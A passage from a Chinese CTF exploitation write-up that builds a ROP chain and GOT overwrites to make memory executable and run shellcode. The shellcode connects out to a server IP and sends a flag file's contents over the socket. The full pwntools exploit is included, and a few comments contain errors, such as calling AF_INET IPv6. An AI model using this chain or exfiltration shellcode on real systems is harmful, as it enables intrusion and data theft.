class="comment">#下面两部分，是在凑齐p64(0x0100007fe8030002),因为ebp一次只能传四字节，因此要传两次</span></span><br><span class="line"><span class="comment">#这个回环地址可以改成⾃⼰的服务器的ip端⼝（以此在比赛当做拿到远程的flag）</span></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=p64(<span class="number">0xe8030002</span>)<span class="comment">#同上，即使最后ebx只传送四字节，但依然要用p64来放到栈里，用来保持一个完整的内存单元</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">8</span>+<span class="number">0x3d</span>)<span class="comment">#这里加8是要跳过flag所处的整个内存单元</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=p64(<span class="number">0x0100007f</span>)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">12</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改alarm的got表为syscall地址</span></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=p64(<span class="number">0x5</span>)</span><br><span class="line">payload+=p64(alarm_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#prctl libc偏移0x122210</span></span><br><span class="line"><span class="comment">#pop_rax_pop_rdx_pop_rbx的偏移为0x166241</span></span><br><span class="line"><span class="comment">#执行完下面的内容之后，prctl函数的got表装的是pop_rax_pop_rdx_pop_rbx ; ret</span></span><br><span class="line">payload+=p64(<span class="number">0x4008da</span>)</span><br><span class="line">payload+=p64(<span class="number">0x44031</span>)</span><br><span class="line">payload+=p64(prctl_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x400618</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接下来执行的内容是</span></span><br><span class="line"><span class="comment">#socket(2,1,0)</span></span><br><span class="line"><span class="comment">#connect(0,socket_struct_addr,0x8)</span></span><br><span class="line"><span class="comment">#open(flag_addr,0)</span></span><br><span class="line"><span class="comment">#read(1,bss_addr+400,0x30)</span></span><br><span class="line"><span class="comment">#write(0,bss_addr+400,0x30)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#socket(2,1,0)ipv6,面向连接的套接字,tcp传输协议</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">2</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(prctl_plt_addr)<span class="comment">#pop_rax_pop_rdx_pop_rbx ; ret</span></span><br><span class="line">payload+=p64(<span class="number">0x29</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)<span class="comment">#syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#connect(soc,struct_socket_addr,sizeof(struct_socket)</span></span><br><span class="line"><span class="comment">#调试socket发现，执行之后，然后的rax值是0，因此connect的rdi为0</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15无用寄存器</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">42</span>)</span><br><span class="line">payload+=p64(<span class="number">16</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#open(flag_addr,0)</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#15无用寄存器</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">2</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rdx无用寄存器</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(open_return_value,bss+400,0x30)</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">400</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15无用寄存器</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(0,bss_addr+400,0x30)</span></span><br><span class="line">payload+=p64(pop_rdi_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_addr)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">400</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15无用寄存器</span></span><br><span class="line">payload+=p64(prctl_plt_addr)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx无用寄存器</span></span><br><span class="line">payload+=p64(alarm_plt_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220426102311543-185742101.png" alt=""></p><p>发现现在的payload是0x2e0…  因此还要换一下方法，大致思路没问题，但是现在要考虑的是怎么让payload更短，其实观察一下上面的payload就会发现很多字节其实都是被浪费掉了，因为p64()打包就填充了非常多的0（如下图）<br><img src="../img/2706180-20220426102321696-469048676.png" alt=""></p><h2 id="试着使用shellcode？">试着使用shellcode？</h2><p>如果我们可以执行对应汇编指令的机器码，并且我们直接将对应的机器码发过去，那岂不是就把p64打包出现很多00的问题给解决了么。</p><p>想执行shellcode其实也非常简单，只需要执行mprotect这个函数把一页内存属性给改成可读可写可执行就ok了。也就是说我们不再去用ret2syscall的手法布置rop链了，先去执行mprotect，然后将我们栈中布置的shellcode拷贝到bss段，最后执行shellcode。</p><p>不过随之产生了几个问题</p><blockquote><p>1、为什么要把shellcode拷贝到bss段？</p><p>答：由于栈基址随机化，我们无法用mprotect函数准确的改变栈的属性，但是bss段的地址是确定的，因此可以使用mprotect函数修改bss段属性，然后只需要将shellcode迁移到bss段即可。</p><p>2、怎么将shellcode拷贝到bss段？</p><p>利用rep movs qword ptr [rdi],qword ptr[rsi] ; ret指令，<strong>这个指令就是将rsi指向的内容赋给rdi指向的内容</strong>，同时执行完毕后rsi和rdi会自动增加，指向下一个内存单元，不断循环该过程，循环的次数由rcx寄存器的值决定（每次减1，减到0为止）</p><p>3、怎么将执行流劫持到bss段？</p><p>hh,这个问题想解决的话，要去调试，最后我解释一下。</p></blockquote><h1>正文开始——构造正确的exp</h1><p>四千字了…  现在才来到了如何构建本题正确的exp</p><p>第一件事，我们需要造一个mprotect函数。我们采用的方法是用magic_gadget将alarm函数的got表修改为mprotect函数的真实地址。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line">payload+=p64(mprotect_offsetalarm_offset)+p64(alarm_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br></pre></td></tr></table></figure><p>现在想控制rbx和rbp的话只能执行csu片段，不过这个缺点非常明显，直接填充了32字节的垃圾数据，但是没办法，暂时只能用csu片段来控制rbx和rbp。</p><p>第二件事，就是执行mprotect函数，只有改变了bss段的内存属性，我们才可以做更多的事情。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(csu_gadget1)<span class="comment">#执行csu片段传参，这没什么好说的</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(alarm_got_addr)</span><br><span class="line">payload+=p64(bss_ye)<span class="comment">#这个就是映射到bss的内存页地址</span></span><br><span class="line">payload+=p64(<span class="number">0x100000</span>)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(csu_gadget2)</span><br></pre></td></tr></table></figure><p>此时的bss段已经变成了可读可写可执行（如下图）</p><p><img src="../img/2706180-20220426103623192-486607434.png" alt=""></p><p>那我们现在要立刻造出来pop_rbx_pop_rbp_ret这个指令，因为我们接下来还要用几次magic_gadget，但是不能每次使用都执行一次csu片段吧，这样的话肯定最后的payload会超长。造这个指令很简单，因为bss段已经可执行（<strong>就是我们往bss段写的内容都可以被当做指令来用</strong>），有什么好说的，直接把需要造的指令对应机器码写到bss段上（上文已经提过利用magic_gadget往bss段写入数据了）</p><p>这个网站可以在线汇编指令转机器码   <a href="(https://defuse.ca/online-x86-assembler.htm#disassembly)">here</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#往bss_addr+0x10写入pop rbx;pop rbp;pop rcx;ret</span></span><br><span class="line"><span class="comment">#5B5D59C3为pop rbx;pop rbp;pop rcx;ret的机器码，由于p64()打包会将数据进行小端序处理，因此我们需要提前手动小端序处理一次，以来确保指令是正常顺序存入bss段的</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xc3595d5b</span>)+p64(bss_addr+<span class="number">0x10</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br></pre></td></tr></table></figure><p>此时我们再执行magic_gadget就可以直接用bss_addr+0x10中存放的pop rbx;pop rbp;pop rcx;ret（至于为什么还要pop rcx，因为这样会更省字节，后面就不用专门造一个pop rcx;ret指令了）</p><p>接着我们需要再造两个指令，分别是:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rep movs qword ptr [rdi],qword ptr[rsi] ; ret #F348A5C3 </span><br><span class="line">mov rsi,rsp;ret #4889E6C3</span><br></pre></td></tr></table></figure><p>第一个很好理解，是负责拷贝的rep，可是为什么要用第二个指令呢？考虑一下我们使用rep的时候怎么去控制这个rsi,我们本来是控制不了，并且我们还需要这个rsi指向当前栈顶的内容（因为rep指令下面就是shellcode了），因此才需要造一个这个gadget出来。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#往bss_addr写入 rep movs qword ptr [rdi],qword ptr[rsi] ; ret</span></span><br><span class="line"></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#现在bss_addr+0x10就相当于pop rbx;pop rbp;pop rcx;ret这个指令了</span></span><br><span class="line">payload+=p64(<span class="number">0xc3a548f3</span>)+p64(bss_addr+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#往bss段+0x8写入mov rsi,rsp;ret</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0xc3e68948</span>)+p64(bss_addr+<span class="number">0x8</span>+<span class="number">0x3d</span>)+p64(<span class="number">15</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br></pre></td></tr></table></figure><p>至此所有准备工作完成，我们接下来就是执行rep指令并且布置shellcode了</p><p>shellcode如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#socket(2,1,0)</span><br><span class="line">push 2</span><br><span class="line">pop rdi</span><br><span class="line">push 1</span><br><span class="line">pop rsi</span><br><span class="line">psuh 0</span><br><span class="line">pop rdx</span><br><span class="line">push 41</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#connect(0,socket_struct_addr,0x8)</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">mov rcx,0x13589c5282230002 #如果打本地的话，这里改成0x0100007fe8030002 对应的ip和端口为127.0.0.1 1000</span><br><span class="line">#push没法直接压入0x13589c5282230002，只能通过寄存器中转</span><br><span class="line">push rcx </span><br><span class="line">mov rsi,rsp</span><br><span class="line">push 0x10</span><br><span class="line">pop rdx</span><br><span class="line">push 42</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#open(flag_addr,0)</span><br><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp#本来这里为了更短应该使用push rsp;pop rdi的，但是不知道为啥，这回程序这么写就会直接崩溃，不过好在溢出卡的不死，也不差这几个字节</span><br><span class="line">push 0</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#read(1,0x601500,0x50)</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">mov rsi,0x601500</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">#write(0,0x601500,0x50)</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">mov rsi,0x601500</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>把上述shellcode全部转成机器码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socket=&quot;\x60\x11\x60\x00\x00\x00\x00\x00\x6A\x02\x5F\x6A\x01\x5E\x6A\x00\x5A\x6A\x29\x58\x0F\x05&quot;</span><br><span class="line"></span><br><span class="line">connect=&quot;\x6A\x00\x5F\x48\xB9\x02\x00\x03\xE8\x7F\x00\x00\x01\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05&quot;</span><br><span class="line"></span><br><span class="line">orw=&quot;\x68\x66\x6C\x61\x67\x48\x89\xE7\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x01\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x00\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span><br></pre></td></tr></table></figure><p>最后的payload执行下rep指令再布置下shellcode</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload+=p64(pop_rdi_addr)+p64(bss_addr+<span class="number">0x50</span>)<span class="comment">#把shellcode布置到bss_addr加0x50的地方</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)<span class="comment">#把rsp的值给rsi，也就是说rsi值为下面这个bss_addr所对应的栈地址</span></span><br><span class="line">payload+=p64(bss_addr)<span class="comment">#执行rep指令，至此拷贝开始</span></span><br></pre></td></tr></table></figure><p>最后再回答一下当时问的怎么将执行流劫持到bss段上。</p><p>通过调试发现，拷贝的时候只有rsi和rdi在移动，而rsp始终没有变，因此我只需要在发送shellcode之前放一个bss段地址（这个地址要执行shellcode的首地址），在payload的最后加上一个ret即可完成劫持执行流。</p><p><img src="../img/2706180-20220426103703621-1232925873.png" alt=""></p><h1>完整exp：</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;47.97.127.1&quot;,26417)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret_addr=<span class="number">0x4004e6</span></span><br><span class="line">magic_gadget_addr=<span class="number">0x400618</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400903</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x400901</span></span><br><span class="line">rdx_offset=<span class="number">0x1b96</span></span><br><span class="line">mprotect_offset=<span class="number">0x11b7e0</span></span><br><span class="line">alarm_offset=<span class="number">0xe44f0</span></span><br><span class="line">close_offset=<span class="number">0x110870</span></span><br><span class="line">prctl_offset=<span class="number">0x122210</span></span><br><span class="line">read_offset=<span class="number">0x110020</span></span><br><span class="line">csu_gadget1=<span class="number">0x4008FA</span></span><br><span class="line">csu_gadget2=<span class="number">0x4008E0</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400645</span></span><br><span class="line">term_hook=<span class="number">0x600e48</span></span><br><span class="line">alarm_got_addr=e.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">alarm_plt_addr=e.plt[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">prctl_got_addr=e.got[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">prctl_plt_addr=e.plt[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">close_got_addr=e.got[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">close_plt_addr=e.plt[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rax_offset=<span class="number">0x24ad4</span></span><br><span class="line">pop_rdx_offset=<span class="number">0x1b96</span></span><br><span class="line">rep_offset=<span class="number">0x3f84a</span></span><br><span class="line">bss_addr=<span class="number">0x601100</span></span><br><span class="line">bss_ye=<span class="number">0x601000</span></span><br><span class="line">mov_rdi_rsp_offset=<span class="number">0x15c2fe</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#socket(2,1,0)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">psuh 0</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 41</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">socket=<span class="string">&quot;\x60\x11\x60\x00\x00\x00\x00\x00\x6A\x02\x5F\x6A\x01\x5E\x6A\x00\x5A\x6A\x29\x58\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#connect(0,socket_struct_addr,0x8)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rcx,0x13589c5282230002</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 0x10</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 42</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="comment">#connect=&quot;\x6A\x00\x5F\x48\xB9\x02\x00\x23\x82\x52\x9C\x58\x13\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#local</span></span><br><span class="line">connect=<span class="string">&quot;\x6A\x00\x5F\x48\xB9\x02\x00\x03\xE8\x7F\x00\x00\x01\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05&quot;</span></span><br><span class="line"><span class="comment">#open(flag_addr,0)</span></span><br><span class="line"><span class="comment">#read(1,0x601500,0x50)</span></span><br><span class="line"><span class="comment">#write(0,0x601500,0x50)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rsi,0x601500</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rsi,0x601500</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#mov rsi,0x601500</span></span><br><span class="line">orw=<span class="string">&quot;\x68\x66\x6C\x61\x67\x48\x89\xE7\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x01\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x00\x5F\x48\xC7\xC6\x00\x15\x60\x00\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">下面三个指令所对应的机器码</span></span><br><span class="line"><span class="string">rep movs qword ptr [rdi],qword ptr[rsi] ; ret #F348A5C3</span></span><br><span class="line"><span class="string">mov rsi,rsp;ret #4889E6C3</span></span><br><span class="line"><span class="string">pop rbx;pop rbp;pop rcx #5B5D59C3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#将alarm函数的got表换成mprotect的真实地址</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line">payload+=p64(mprotect_offset-alarm_offset)+p64(alarm_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行mprotect函数</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(alarm_got_addr)</span><br><span class="line">payload+=p64(bss_ye)</span><br><span class="line">payload+=p64(<span class="number">0x100000</span>)+p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#往bss段+0x10写入pop rbx;pop rbp;pop rcx;ret</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xc3595d5b</span>)+p64(bss_addr+<span class="number">0x10</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#往bss段写入 rep movs qword ptr [rdi],qword ptr[rsi] ; ret</span></span><br><span class="line"><span class="comment">#payload+=p64(bss_addr+0x10)</span></span><br><span class="line">payload+=p64(<span class="number">0xc3a548f3</span>)+p64(bss_addr+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#往bss段+0x8写入mov rsi,rsp;ret</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0xc3e68948</span>)+p64(bss_addr+<span class="number">0x8</span>+<span class="number">0x3d</span>)+p64(<span class="number">15</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行rep指令</span></span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(bss_addr+<span class="number">0x50</span>)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=socket+connect+orw</span><br><span class="line">payload+=p64(ret_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;shellcode_length----------&gt;&#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(socket+connect+orw)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;payload_length------------&gt;&#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220426103751910-1556922758.png" alt=""></p><h1>补充：</h1><h2 id="关于socket和connect的参数">关于socket和connect的参数</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">socket</span><span class="params">(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol)</span>;</span><br></pre></td></tr></table></figure><p>第一个参数是地址族，也就是IP地址的类型；第二个参数是数据的传输方式；第三个参数是采用的传输协议</p><p>这个没什么好说的，我们最后参数采用的分别是2,1,0 即ipv6，面向连接的套接字，TCP传输协议</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> sockfd, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr,<span class="type">socklen_t</span> addrlen)</span>;</span><br></pre></td></tr></table></figure><p>第一个参数是socket函数返回的文件描述符；第二个参数是sockaddr结构体的地址；第三个参数是sockaddr的结构体大小</p><p>第一个参数没什么好说的，第二个就很有讲究了，什么是sockaddr结构体？不知道这个怎么写payload？翻一下glibc源码（这个sockaddr结构体位于socket.h这个文件下）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    __SOCKADDR_COMMON (sa_);        <span class="comment">/* Common data: address family and length.  */</span></span><br><span class="line">    <span class="type">char</span> sa_data[<span class="number">14</span>];                <span class="comment">/* Address data.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>第一个成员放的是地址族，第二个成员放的是ip地址加端口（这里要把ip地址和端口转换成十六进制以小端序发送（参考如下）</p><p>以转换127.0.0.1 1000为例</p><p>分别把127 0 0 1 1000转换成16进制7F 00 00 01 03e8，然后反序排列为0100007F03e8（<strong>因为p64打包会使ip地址和端口以小端序排列，而最后使用的时候又要使用正序的ip地址和端口，因此我们先将其转换为反序，再用p64打包，最后存储在sockaddr的结构体中的数据依然是正序的ip和端口</strong>）</p><p>第三个结构体就自然而然是16字节了（当时有一个困惑的点就是发送sockaddr结构体的时候，明明只写了8字节，但这个大小（也就是第三个参数）非要填16字节，看完源码答案自然而解）</p><h2 